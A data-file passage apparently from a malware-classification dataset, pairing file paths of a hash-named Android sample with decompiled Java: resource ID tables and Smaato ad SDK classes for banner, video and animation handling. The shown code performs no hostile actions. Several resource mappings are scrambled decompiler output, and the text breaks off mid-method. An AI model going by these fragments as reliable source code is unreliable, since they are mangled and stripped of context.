"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\attr.code","public static final class attr {   public static int AdType=2130772004;   public static int adDimension=2130772001;   public static int adSize=dev.camera360.collage.R.attr.adSize;   public static int adSpaceId=2130772005;   public static int adUnitId=dev.camera360.collage.R.attr.adUnitId;   public static int age=2130771998;   public static int autoReloadEnabled=2130771987;   public static int autoReloadFrequency=2130771986;   public static int backgroundColor=2130771985;   public static int bannerHeight=2130772003;   public static int bannerWidth=2130772002;   public static int cameraBearing=dev.camera360.collage.R.attr.testing;   public static int cameraTargetLat=dev.camera360.collage.R.attr.isGoneWithoutAd;   public static int cameraTargetLng=dev.camera360.collage.R.attr.gif;   public static int cameraTilt=dev.camera360.collage.R.attr.paused;   public static int cameraZoom=dev.camera360.collage.R.attr.gifMoviewViewStyle;   public static int city=2130771994;   public static int country=2130771993;   public static int fontColor=2130771984;   public static int gender=2130771999;   public static int keywordList=2130771990;   public static int latitude=2130771996;   public static int loadNewBanner=2130771988;   public static int locationUpdateEnabled=2130771989;   public static int longitude=2130771997;   public static int mapType=dev.camera360.collage.R.attr.keywords;   public static int publisherId=2130772006;   public static int region=2130771992;   public static int searchQuery=2130771991;   public static int uiCompass=dev.camera360.collage.R.attr.test_mode;   public static int uiRotateGestures=dev.camera360.collage.R.attr.banner_type;   public static int uiScrollGestures=dev.camera360.collage.R.attr.animation;   public static int uiTiltGestures=dev.camera360.collage.R.attr.placementType;   public static int uiZoomControls=dev.camera360.collage.R.attr.canShowMR;   public static int uiZoomGestures=2130771981;   public static int useViewLifecycle=2130771982;   public static int userProfileEnabled=2130772000;   public static int zOrderOnTop=2130771983;   public static int zip=2130771995; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\color.code","public static final class color {   public static int common_action_bar_splitter=dev.camera360.collage.R.layout.gadget_dialog;   public static int common_signin_btn_dark_text_default=dev.camera360.collage.R.layout.bookmark_grid_dialog;   public static int common_signin_btn_dark_text_disabled=dev.camera360.collage.R.layout.brush_chooser;   public static int common_signin_btn_dark_text_focused=dev.camera360.collage.R.layout.christmas_dialog;   public static int common_signin_btn_dark_text_pressed=dev.camera360.collage.R.layout.bookmark_item;   public static int common_signin_btn_default_background=dev.camera360.collage.R.layout.flickr_dialog;   public static int common_signin_btn_light_text_default=dev.camera360.collage.R.layout.comment_dialog;   public static int common_signin_btn_light_text_disabled=dev.camera360.collage.R.layout.custom_bar_notification;   public static int common_signin_btn_light_text_focused=dev.camera360.collage.R.layout.erase_chooser;   public static int common_signin_btn_light_text_pressed=dev.camera360.collage.R.layout.confirm_dialog3;   public static int common_signin_btn_text_dark=dev.camera360.collage.R.layout.gadget_dialog2;   public static int common_signin_btn_text_light=dev.camera360.collage.R.layout.gallery_dialog2; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\drawable.code","public static final class drawable {   public static int common_signin_btn_icon_dark=dev.camera360.collage.R.drawable.add_button;   public static int common_signin_btn_icon_disabled_dark=dev.camera360.collage.R.drawable.add_text_button;   public static int common_signin_btn_icon_disabled_focus_dark=dev.camera360.collage.R.drawable.addappicon_button;   public static int common_signin_btn_icon_disabled_focus_light=dev.camera360.collage.R.drawable.addbookmark_button;   public static int common_signin_btn_icon_disabled_light=dev.camera360.collage.R.drawable.addinstant;   public static int common_signin_btn_icon_focus_dark=dev.camera360.collage.R.drawable.addmoment_button;   public static int common_signin_btn_icon_focus_light=dev.camera360.collage.R.drawable.af_icon_list;   public static int common_signin_btn_icon_light=dev.camera360.collage.R.drawable.alert_dialog_icon;   public static int common_signin_btn_icon_normal_dark=dev.camera360.collage.R.drawable.antivirus;   public static int common_signin_btn_icon_normal_light=dev.camera360.collage.R.drawable.appicon_button;   public static int common_signin_btn_icon_pressed_dark=dev.camera360.collage.R.drawable.apply_button;   public static int common_signin_btn_icon_pressed_light=dev.camera360.collage.R.drawable.arrow_left_button;   public static int common_signin_btn_text_dark=dev.camera360.collage.R.drawable.arrow_left_normal;   public static int common_signin_btn_text_disabled_dark=dev.camera360.collage.R.drawable.arrow_left_pressed;   public static int common_signin_btn_text_disabled_focus_dark=dev.camera360.collage.R.drawable.arrow_right_button;   public static int common_signin_btn_text_disabled_focus_light=dev.camera360.collage.R.drawable.arrow_right_normal;   public static int common_signin_btn_text_disabled_light=dev.camera360.collage.R.drawable.arrow_right_pressed;   public static int common_signin_btn_text_focus_dark=dev.camera360.collage.R.drawable.back_button;   public static int common_signin_btn_text_focus_light=dev.camera360.collage.R.drawable.back_button2;   public static int common_signin_btn_text_light=dev.camera360.collage.R.drawable.back_draw_button;   public static int common_signin_btn_text_normal_dark=dev.camera360.collage.R.drawable.bestyoutube_icon;   public static int common_signin_btn_text_normal_light=dev.camera360.collage.R.drawable.bg_flat_grey_border;   public static int common_signin_btn_text_pressed_dark=dev.camera360.collage.R.drawable.bg_flight_gray_body;   public static int common_signin_btn_text_pressed_light=dev.camera360.collage.R.drawable.bg_flight_gray_bottom;   public static int ic_launcher=dev.camera360.collage.R.drawable.bg_flight_gray_top;   public static int ic_plusone_medium_off_client=dev.camera360.collage.R.drawable.bg_flight_white_body;   public static int ic_plusone_small_off_client=dev.camera360.collage.R.drawable.bg_flight_white_bottom;   public static int ic_plusone_standard_off_client=dev.camera360.collage.R.drawable.bg_flight_white_top;   public static int ic_plusone_tall_off_client=dev.camera360.collage.R.drawable.bg_grey; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\id.code","public static final class id {   public static int hybrid=dev.camera360.collage.R.anim.left_right_anim;   public static int none=dev.camera360.collage.R.anim.custom_anim;   public static int normal=dev.camera360.collage.R.anim.fade_in;   public static int satellite=dev.camera360.collage.R.anim.fade_in2;   public static int terrain=dev.camera360.collage.R.anim.fade_out; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\integer.code","public static final class integer {   public static int google_play_services_version=dev.camera360.collage.R.array.min_level_options; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\R.code","public final class R { public static final class attr {     public static int AdType=2130772004;     public static int adDimension=2130772001;     public static int adSize=dev.camera360.collage.R.attr.adSize;     public static int adSpaceId=2130772005;     public static int adUnitId=dev.camera360.collage.R.attr.adUnitId;     public static int age=2130771998;     public static int autoReloadEnabled=2130771987;     public static int autoReloadFrequency=2130771986;     public static int backgroundColor=2130771985;     public static int bannerHeight=2130772003;     public static int bannerWidth=2130772002;     public static int cameraBearing=dev.camera360.collage.R.attr.testing;     public static int cameraTargetLat=dev.camera360.collage.R.attr.isGoneWithoutAd;     public static int cameraTargetLng=dev.camera360.collage.R.attr.gif;     public static int cameraTilt=dev.camera360.collage.R.attr.paused;     public static int cameraZoom=dev.camera360.collage.R.attr.gifMoviewViewStyle;     public static int city=2130771994;     public static int country=2130771993;     public static int fontColor=2130771984;     public static int gender=2130771999;     public static int keywordList=2130771990;     public static int latitude=2130771996;     public static int loadNewBanner=2130771988;     public static int locationUpdateEnabled=2130771989;     public static int longitude=2130771997;     public static int mapType=dev.camera360.collage.R.attr.keywords;     public static int publisherId=2130772006;     public static int region=2130771992;     public static int searchQuery=2130771991;     public static int uiCompass=dev.camera360.collage.R.attr.test_mode;     public static int uiRotateGestures=dev.camera360.collage.R.attr.banner_type;     public static int uiScrollGestures=dev.camera360.collage.R.attr.animation;     public static int uiTiltGestures=dev.camera360.collage.R.attr.placementType;     public static int uiZoomControls=dev.camera360.collage.R.attr.canShowMR;     public static int uiZoomGestures=2130771981;     public static int useViewLifecycle=2130771982;     public static int userProfileEnabled=2130772000;     public static int zOrderOnTop=2130771983;     public static int zip=2130771995;   } public static final class color {     public static int common_action_bar_splitter=dev.camera360.collage.R.layout.gadget_dialog;     public static int common_signin_btn_dark_text_default=dev.camera360.collage.R.layout.bookmark_grid_dialog;     public static int common_signin_btn_dark_text_disabled=dev.camera360.collage.R.layout.brush_chooser;     public static int common_signin_btn_dark_text_focused=dev.camera360.collage.R.layout.christmas_dialog;     public static int common_signin_btn_dark_text_pressed=dev.camera360.collage.R.layout.bookmark_item;     public static int common_signin_btn_default_background=dev.camera360.collage.R.layout.flickr_dialog;     public static int common_signin_btn_light_text_default=dev.camera360.collage.R.layout.comment_dialog;     public static int common_signin_btn_light_text_disabled=dev.camera360.collage.R.layout.custom_bar_notification;     public static int common_signin_btn_light_text_focused=dev.camera360.collage.R.layout.erase_chooser;     public static int common_signin_btn_light_text_pressed=dev.camera360.collage.R.layout.confirm_dialog3;     public static int common_signin_btn_text_dark=dev.camera360.collage.R.layout.gadget_dialog2;     public static int common_signin_btn_text_light=dev.camera360.collage.R.layout.gallery_dialog2;   } public static final class drawable {     public static int common_signin_btn_icon_dark=dev.camera360.collage.R.drawable.add_button;     public static int common_signin_btn_icon_disabled_dark=dev.camera360.collage.R.drawable.add_text_button;     public static int common_signin_btn_icon_disabled_focus_dark=dev.camera360.collage.R.drawable.addappicon_button;     public static int common_signin_btn_icon_disabled_focus_light=dev.camera360.collage.R.drawable.addbookmark_button;     public static int common_signin_btn_icon_disabled_light=dev.camera360.collage.R.drawable.addinstant;     public static int common_signin_btn_icon_focus_dark=dev.camera360.collage.R.drawable.addmoment_button;     public static int common_signin_btn_icon_focus_light=dev.camera360.collage.R.drawable.af_icon_list;     public static int common_signin_btn_icon_light=dev.camera360.collage.R.drawable.alert_dialog_icon;     public static int common_signin_btn_icon_normal_dark=dev.camera360.collage.R.drawable.antivirus;     public static int common_signin_btn_icon_normal_light=dev.camera360.collage.R.drawable.appicon_button;     public static int common_signin_btn_icon_pressed_dark=dev.camera360.collage.R.drawable.apply_button;     public static int common_signin_btn_icon_pressed_light=dev.camera360.collage.R.drawable.arrow_left_button;     public static int common_signin_btn_text_dark=dev.camera360.collage.R.drawable.arrow_left_normal;     public static int common_signin_btn_text_disabled_dark=dev.camera360.collage.R.drawable.arrow_left_pressed;     public static int common_signin_btn_text_disabled_focus_dark=dev.camera360.collage.R.drawable.arrow_right_button;     public static int common_signin_btn_text_disabled_focus_light=dev.camera360.collage.R.drawable.arrow_right_normal;     public static int common_signin_btn_text_disabled_light=dev.camera360.collage.R.drawable.arrow_right_pressed;     public static int common_signin_btn_text_focus_dark=dev.camera360.collage.R.drawable.back_button;     public static int common_signin_btn_text_focus_light=dev.camera360.collage.R.drawable.back_button2;     public static int common_signin_btn_text_light=dev.camera360.collage.R.drawable.back_draw_button;     public static int common_signin_btn_text_normal_dark=dev.camera360.collage.R.drawable.bestyoutube_icon;     public static int common_signin_btn_text_normal_light=dev.camera360.collage.R.drawable.bg_flat_grey_border;     public static int common_signin_btn_text_pressed_dark=dev.camera360.collage.R.drawable.bg_flight_gray_body;     public static int common_signin_btn_text_pressed_light=dev.camera360.collage.R.drawable.bg_flight_gray_bottom;     public static int ic_launcher=dev.camera360.collage.R.drawable.bg_flight_gray_top;     public static int ic_plusone_medium_off_client=dev.camera360.collage.R.drawable.bg_flight_white_body;     public static int ic_plusone_small_off_client=dev.camera360.collage.R.drawable.bg_flight_white_bottom;     public static int ic_plusone_standard_off_client=dev.camera360.collage.R.drawable.bg_flight_white_top;     public static int ic_plusone_tall_off_client=dev.camera360.collage.R.drawable.bg_grey;   } public static final class id {     public static int hybrid=dev.camera360.collage.R.anim.left_right_anim;     public static int none=dev.camera360.collage.R.anim.custom_anim;     public static int normal=dev.camera360.collage.R.anim.fade_in;     public static int satellite=dev.camera360.collage.R.anim.fade_in2;     public static int terrain=dev.camera360.collage.R.anim.fade_out;   } public static final class integer {     public static int google_play_services_version=dev.camera360.collage.R.array.min_level_options;   } public static final class string {     public static int Keyword=2131034139;     public static int Search=2131034140;     public static int app_name=2131034141;     public static int auth_client_needs_enabling_title=2131034133;     public static int auth_client_needs_installation_title=2131034134;     public static int auth_client_needs_update_title=2131034135;     public static int auth_client_play_services_err_notification_msg=2131034136;     public static int auth_client_requested_by_msg=2131034137;     public static int auth_client_using_bad_version_title=2131034132;     public static int common_google_play_services_enable_button=2131034118;     public static int common_google_play_services_enable_text=2131034117;     public static int common_google_play_services_enable_title=dev.camera360.collage.R.raw.popular_quotes;     public static int common_google_play_services_install_button=dev.camera360.collage.R.raw.new_quotes;     public static int common_google_play_services_install_text_phone=dev.camera360.collage.R.raw.help_eng;     public static int common_google_play_services_install_text_tablet=dev.camera360.collage.R.raw.help_thai;     public static int common_google_play_services_install_title=dev.camera360.collage.R.raw.changelog_eng;     public static int common_google_play_services_invalid_account_text=2131034124;     public static int common_google_play_services_invalid_account_title=2131034123;     public static int common_google_play_services_network_error_text=2131034122;     public static int common_google_play_services_network_error_title=2131034121;     public static int common_google_play_services_unknown_issue=2131034125;     public static int common_google_play_services_unsupported_date_text=2131034128;     public static int common_google_play_services_unsupported_text=2131034127;     public static int common_google_play_services_unsupported_title=2131034126;     public static int common_google_play_services_update_button=2131034129;     public static int common_google_play_services_update_text=2131034120;     public static int common_google_play_services_update_title=2131034119;     public static int common_signin_button_text=2131034130;     public static int common_signin_button_text_long=2131034131;     public static int getad=2131034138;   } public static final class style {     public static int AppBaseTheme=dev.camera360.collage.R.id.BANNER;     public static int AppTheme=dev.camera360.collage.R.id.IAB_MRECT;   } public static final class styleable {     public static final int AdsAttrs_adSize=0x00000000;     public static final int AdsAttrs_adUnitId=0x00000001;     public static final int MapAttrs_cameraBearing=0x00000001;     public static final int MapAttrs_cameraTargetLat=0x00000002;     public static final int MapAttrs_cameraTargetLng=0x00000003;     public static final int MapAttrs_cameraTilt=0x00000004;     public static final int MapAttrs_cameraZoom=0x00000005;     public static final int MapAttrs_mapType=0x00000000;     public static final int MapAttrs_uiCompass=0x00000006;     public static final int MapAttrs_uiRotateGestures=0x00000007;     public static final int MapAttrs_uiScrollGestures=0x00000008;     public static final int MapAttrs_uiTiltGestures=0x00000009;     public static final int MapAttrs_uiZoomControls=0x0000000a;     public static final int MapAttrs_uiZoomGestures=0x0000000b;     public static final int MapAttrs_useViewLifecycle=0x0000000c;     public static final int MapAttrs_zOrderOnTop=0x0000000d;     public static final int com_smaato_soma_BannerView_AdType=0x00000014;     public static final int com_smaato_soma_BannerView_adDimension=0x00000011;     public static final int com_smaato_soma_BannerView_adSpaceId=0x00000015;     public static final int com_smaato_soma_BannerView_age=0x0000000e;     public static final int com_smaato_soma_BannerView_autoReloadEnabled=0x00000003;     public static final int com_smaato_soma_BannerView_autoReloadFrequency=0x00000002;     public static final int com_smaato_soma_BannerView_backgroundColor=0x00000001;     public static final int com_smaato_soma_BannerView_bannerHeight=0x00000013;     public static final int com_smaato_soma_BannerView_bannerWidth=0x00000012;     public static final int com_smaato_soma_BannerView_city=0x0000000a;     public static final int com_smaato_soma_BannerView_country=0x00000009;     public static final int com_smaato_soma_BannerView_fontColor=0x00000000;     public static final int com_smaato_soma_BannerView_gender=0x0000000f;     public static final int com_smaato_soma_BannerView_keywordList=0x00000006;     public static final int com_smaato_soma_BannerView_latitude=0x0000000c;     public static final int com_smaato_soma_BannerView_loadNewBanner=0x00000004;     public static final int com_smaato_soma_BannerView_locationUpdateEnabled=0x00000005;     public static final int com_smaato_soma_BannerView_longitude=0x0000000d;     public static final int com_smaato_soma_BannerView_publisherId=0x00000016;     public static final int com_smaato_soma_BannerView_region=0x00000008;     public static final int com_smaato_soma_BannerView_searchQuery=0x00000007;     public static final int com_smaato_soma_BannerView_userProfileEnabled=0x00000010;     public static final int com_smaato_soma_BannerView_zip=0x0000000b;     public static final int[] AdsAttrs={dev.camera360.collage.R.attr.adSize,dev.camera360.collage.R.attr.adUnitId};     public static final int[] MapAttrs={dev.camera360.collage.R.attr.keywords,dev.camera360.collage.R.attr.testing,dev.camera360.collage.R.attr.isGoneWithoutAd,dev.camera360.collage.R.attr.gif,dev.camera360.collage.R.attr.paused,dev.camera360.collage.R.attr.gifMoviewViewStyle,dev.camera360.collage.R.attr.test_mode,dev.camera360.collage.R.attr.banner_type,dev.camera360.collage.R.attr.animation,dev.camera360.collage.R.attr.placementType,dev.camera360.collage.R.attr.canShowMR,2130771981,2130771982,2130771983};     public static final int[] com_smaato_soma_BannerView={2130771984,2130771985,2130771986,2130771987,2130771988,2130771989,2130771990,2130771991,2130771992,2130771993,2130771994,2130771995,2130771996,2130771997,2130771998,2130771999,2130772000,2130772001,2130772002,2130772003,2130772004,2130772005,2130772006};   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\string.code","public static final class string {   public static int Keyword=2131034139;   public static int Search=2131034140;   public static int app_name=2131034141;   public static int auth_client_needs_enabling_title=2131034133;   public static int auth_client_needs_installation_title=2131034134;   public static int auth_client_needs_update_title=2131034135;   public static int auth_client_play_services_err_notification_msg=2131034136;   public static int auth_client_requested_by_msg=2131034137;   public static int auth_client_using_bad_version_title=2131034132;   public static int common_google_play_services_enable_button=2131034118;   public static int common_google_play_services_enable_text=2131034117;   public static int common_google_play_services_enable_title=dev.camera360.collage.R.raw.popular_quotes;   public static int common_google_play_services_install_button=dev.camera360.collage.R.raw.new_quotes;   public static int common_google_play_services_install_text_phone=dev.camera360.collage.R.raw.help_eng;   public static int common_google_play_services_install_text_tablet=dev.camera360.collage.R.raw.help_thai;   public static int common_google_play_services_install_title=dev.camera360.collage.R.raw.changelog_eng;   public static int common_google_play_services_invalid_account_text=2131034124;   public static int common_google_play_services_invalid_account_title=2131034123;   public static int common_google_play_services_network_error_text=2131034122;   public static int common_google_play_services_network_error_title=2131034121;   public static int common_google_play_services_unknown_issue=2131034125;   public static int common_google_play_services_unsupported_date_text=2131034128;   public static int common_google_play_services_unsupported_text=2131034127;   public static int common_google_play_services_unsupported_title=2131034126;   public static int common_google_play_services_update_button=2131034129;   public static int common_google_play_services_update_text=2131034120;   public static int common_google_play_services_update_title=2131034119;   public static int common_signin_button_text=2131034130;   public static int common_signin_button_text_long=2131034131;   public static int getad=2131034138; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\style.code","public static final class style {   public static int AppBaseTheme=dev.camera360.collage.R.id.BANNER;   public static int AppTheme=dev.camera360.collage.R.id.IAB_MRECT; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannertwister\styleable.code","public static final class styleable {   public static final int AdsAttrs_adSize=0x00000000;   public static final int AdsAttrs_adUnitId=0x00000001;   public static final int MapAttrs_cameraBearing=0x00000001;   public static final int MapAttrs_cameraTargetLat=0x00000002;   public static final int MapAttrs_cameraTargetLng=0x00000003;   public static final int MapAttrs_cameraTilt=0x00000004;   public static final int MapAttrs_cameraZoom=0x00000005;   public static final int MapAttrs_mapType=0x00000000;   public static final int MapAttrs_uiCompass=0x00000006;   public static final int MapAttrs_uiRotateGestures=0x00000007;   public static final int MapAttrs_uiScrollGestures=0x00000008;   public static final int MapAttrs_uiTiltGestures=0x00000009;   public static final int MapAttrs_uiZoomControls=0x0000000a;   public static final int MapAttrs_uiZoomGestures=0x0000000b;   public static final int MapAttrs_useViewLifecycle=0x0000000c;   public static final int MapAttrs_zOrderOnTop=0x0000000d;   public static final int com_smaato_soma_BannerView_AdType=0x00000014;   public static final int com_smaato_soma_BannerView_adDimension=0x00000011;   public static final int com_smaato_soma_BannerView_adSpaceId=0x00000015;   public static final int com_smaato_soma_BannerView_age=0x0000000e;   public static final int com_smaato_soma_BannerView_autoReloadEnabled=0x00000003;   public static final int com_smaato_soma_BannerView_autoReloadFrequency=0x00000002;   public static final int com_smaato_soma_BannerView_backgroundColor=0x00000001;   public static final int com_smaato_soma_BannerView_bannerHeight=0x00000013;   public static final int com_smaato_soma_BannerView_bannerWidth=0x00000012;   public static final int com_smaato_soma_BannerView_city=0x0000000a;   public static final int com_smaato_soma_BannerView_country=0x00000009;   public static final int com_smaato_soma_BannerView_fontColor=0x00000000;   public static final int com_smaato_soma_BannerView_gender=0x0000000f;   public static final int com_smaato_soma_BannerView_keywordList=0x00000006;   public static final int com_smaato_soma_BannerView_latitude=0x0000000c;   public static final int com_smaato_soma_BannerView_loadNewBanner=0x00000004;   public static final int com_smaato_soma_BannerView_locationUpdateEnabled=0x00000005;   public static final int com_smaato_soma_BannerView_longitude=0x0000000d;   public static final int com_smaato_soma_BannerView_publisherId=0x00000016;   public static final int com_smaato_soma_BannerView_region=0x00000008;   public static final int com_smaato_soma_BannerView_searchQuery=0x00000007;   public static final int com_smaato_soma_BannerView_userProfileEnabled=0x00000010;   public static final int com_smaato_soma_BannerView_zip=0x0000000b;   public static final int[] AdsAttrs={dev.camera360.collage.R.attr.adSize,dev.camera360.collage.R.attr.adUnitId};   public static final int[] MapAttrs={dev.camera360.collage.R.attr.keywords,dev.camera360.collage.R.attr.testing,dev.camera360.collage.R.attr.isGoneWithoutAd,dev.camera360.collage.R.attr.gif,dev.camera360.collage.R.attr.paused,dev.camera360.collage.R.attr.gifMoviewViewStyle,dev.camera360.collage.R.attr.test_mode,dev.camera360.collage.R.attr.banner_type,dev.camera360.collage.R.attr.animation,dev.camera360.collage.R.attr.placementType,dev.camera360.collage.R.attr.canShowMR,2130771981,2130771982,2130771983};   public static final int[] com_smaato_soma_BannerView={2130771984,2130771985,2130771986,2130771987,2130771988,2130771989,2130771990,2130771991,2130771992,2130771993,2130771994,2130771995,2130771996,2130771997,2130771998,2130771999,2130772000,2130772001,2130772002,2130772003,2130772004,2130772005,2130772006}; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\AbstractBannerPackage.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5481a015"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\AnonymousClass4.code","public class AnonymousClass4 extends CrashReportTemplate<Void> {   private final WebChromeClient.CustomViewCallback b;   private final View c;   private final VideoChromeClientImpl d;   AnonymousClass4(  WebChromeClient.CustomViewCallback customViewCallback,  View view,  VideoChromeClientImpl videoChromeClientImpl){     this.b=customViewCallback;     this.c=view;     this.d=videoChromeClientImpl;   }   @Override public Void b() throws Exception {     Debugger.a(new LogMessage(VideoChrome.TAG,""onShowCustomView()"",1,DebugCategory.ERROR));     VideoChromeClientImpl.this.c=this.b;     if (this.c instanceof FrameLayout) {       FrameLayout frameLayout=(FrameLayout)this.c;       if (frameLayout.getFocusedChild() instanceof VideoView) {         VideoChromeClientImpl.this.d=(VideoView)frameLayout.getFocusedChild();         frameLayout.removeView(VideoChromeClientImpl.this.d);         VideoChromeClientImpl.this.e=VideoChromeClientImpl.this.a(VideoChromeClientImpl.this.b());         VideoChromeClientImpl.this.e.addView(VideoChromeClientImpl.this.d);         VideoChromeClientImpl.this.d.setOnCompletionListener(this.d);         VideoChromeClientImpl.this.d.setOnErrorListener(this.d);         VideoChromeClientImpl.this.d.setOnKeyListener(new View.OnKeyListener(){           @Override public boolean onKey(          final View view,          final int i,          final KeyEvent keyEvent){             return new CrashReportTemplate<Boolean>(){               @Override public Boolean b() throws Exception {                 if (view == null) {                   return false;                 }                 if (i == 4 && keyEvent.getAction() == 1) {                   Debugger.a(new LogMessage(""VideoTest"",""Back key pressed"",1,DebugCategory.DEBUG));                   VideoChromeClientImpl.this.a();                   return true;                 }                 return false;               }             } .c().booleanValue();           }         } );         VideoChromeClientImpl.this.d.start();         return null;       }       return null;     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\BannerAnimator.code","public class BannerAnimator {   private static BannerAnimator a=null;   private final String b=""BannerAnimator"";   private final int c=250;   private boolean d=false;   protected BannerAnimator(){   }   public static synchronized BannerAnimator a(){     BannerAnimator bannerAnimator; synchronized (BannerAnimator.class) {       if (a == null) {         a=new BannerAnimator();       }       bannerAnimator=a;     }     return bannerAnimator;   }   public final void a(  int i,  int i2,  final AbstractBannerPackage abstractBannerPackage,  final BaseView baseView,  float f) throws ExpandingBannerFailed {     WebView c;     try {       Debugger.a(new Object(){       } );       if (baseView == null || abstractBannerPackage == null) {         Debugger.a(new LogMessage(""BannerAnimator"",""Unable to expand the view ..."",1,DebugCategory.WARNING));         return;       }       BannerStateListener bannerStateListener=baseView.getBannerStateListener();       baseView.getBannerState();       if (bannerStateListener != null) {         bannerStateListener.a(baseView);       }       View rootView=baseView.getRootView();       Debugger.a(new LogMessage(""BannerAnimator"",""RootViewName: "" + rootView.getClass().getCanonicalName(),1,DebugCategory.DEBUG));       View findViewById=rootView.findViewById(R.id.content);       if (findViewById != null && abstractBannerPackage != null && (c=abstractBannerPackage.c()) != null) { synchronized (c) {           FrameLayout frameLayout=(FrameLayout)findViewById;           RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams((int)(40.0f * f),(int)(40.0f * f));           layoutParams.addRule(10);           layoutParams.addRule(11);           c.setOnKeyListener(new View.OnKeyListener(){             @Override public boolean onKey(            final View view,            final int i3,            final KeyEvent keyEvent){               final AbstractBannerPackage abstractBannerPackage2=abstractBannerPackage;               final BaseView baseView2=baseView;               return new CrashReportTemplate<Boolean>(){                 @Override public Boolean b() throws Exception {                   if (view == null) {                     return false;                   }                   if (i3 == 4 && keyEvent.getAction() == 1 && abstractBannerPackage2 != null) {                     Debugger.a(new LogMessage(""BannerAnimator"",""Back pressed"",1,DebugCategory.DEBUG));                     baseView2.getBannerAnimatorHandler().sendMessage(baseView2.getBannerAnimatorHandler().obtainMessage(Values.MESSAGE_CLOSE));                     BannerAnimator.this.a(abstractBannerPackage2,baseView2);                     return true;                   }                   return false;                 }               } .c().booleanValue();             }           } );           c.setOnTouchListener(new View.OnTouchListener(){             @Override public boolean onTouch(            final View view,            final MotionEvent motionEvent){               return new CrashReportTemplate<Boolean>(){                 @Override public Boolean b() throws Exception { switch (motionEvent.getAction()) { case 0: case 1:                     if (!view.hasFocus()) {                       view.requestFocus();                       break;                     }                   break;               }               return false;             }           } .c().booleanValue();         }       } );       baseView.removeView(c);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);       layoutParams2.addRule(13);       c.setLayoutParams(layoutParams2);       c.bringToFront();       c.requestFocus(130);       if (c.getParent() != null) {         ((ViewGroup)c.getParent()).removeView(c);       }       frameLayout.addView(c);       Animation a2=a(findViewById,abstractBannerPackage,baseView);       a2.setAnimationListener(new Animation.AnimationListener(){         @Override public void onAnimationStart(        Animation animation){         }         @Override public void onAnimationRepeat(        Animation animation){         }         @Override public void onAnimationEnd(        Animation animation){           final AbstractBannerPackage abstractBannerPackage2=abstractBannerPackage;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (abstractBannerPackage2 != null && abstractBannerPackage2.h() != null && (abstractBannerPackage2 instanceof RichMediaBanner)) {                 abstractBannerPackage2.h().a(""expanded"");                 return null;               }               return null;             }           } .c();         }       } );       c.startAnimation(a2);     }   } }  catch (RuntimeException e) {   throw e; } catch (Exception e2) {   throw new ExpandingBannerFailed(e2); } } public void a(final AbstractBannerPackage abstractBannerPackage,final BaseView baseView) throws UnableToAnimateCloseView { View rootView; View findViewById; WebView c; try {   Debugger.a(new Object(){   } );   if (baseView != null && (rootView=baseView.getRootView()) != null && (findViewById=rootView.findViewById(R.id.content)) != null && abstractBannerPackage != null && (c=abstractBannerPackage.c()) != null) {     Animation a2=a(c.getHeight(),findViewById,abstractBannerPackage,baseView);     a2.setAnimationListener(new Animation.AnimationListener(){       @Override public void onAnimationStart(      Animation animation){         if (abstractBannerPackage.e()) {           final AbstractBannerPackage abstractBannerPackage2=abstractBannerPackage;           final BaseView baseView2=baseView;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               WebView c2=abstractBannerPackage2.c();               ((ViewGroup)c2.getParent()).removeView(c2);               baseView2.addView(c2);               c2.setOnKeyListener(null);               abstractBannerPackage2.h().a(""default"");               return null;             }           } .c();         }       }       @Override public void onAnimationRepeat(      Animation animation){       }       @Override public void onAnimationEnd(      Animation animation){         if (!abstractBannerPackage.e()) {           final AbstractBannerPackage abstractBannerPackage2=abstractBannerPackage;           final BaseView baseView2=baseView;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (abstractBannerPackage2 != null) { synchronized (abstractBannerPackage2) {                   WebView c2=abstractBannerPackage2.c();                   if (c2 != null) { synchronized (c2) {                       if (c2.getParent() != null) {                         ((ViewGroup)c2.getParent()).removeView(c2);                         if (!(baseView2 instanceof ToasterLayout)) {                           if (!BannerAnimator.this.d) {                             baseView2.b();                           }                         }                       }                     }                   }                 }               }               return null;             }           } .c();         }       }     } );     abstractBannerPackage.c().startAnimation(a2);   } }  catch (RuntimeException e) {   throw e; } catch (Exception e2) {   throw new UnableToAnimateCloseView(e2); } } private Animation a(int i,View view,AbstractBannerPackage abstractBannerPackage,BaseView baseView) throws ShrinkAnimationFailed { try {   Debugger.a(new Object(){   } );   AnimationSet animationSet=new 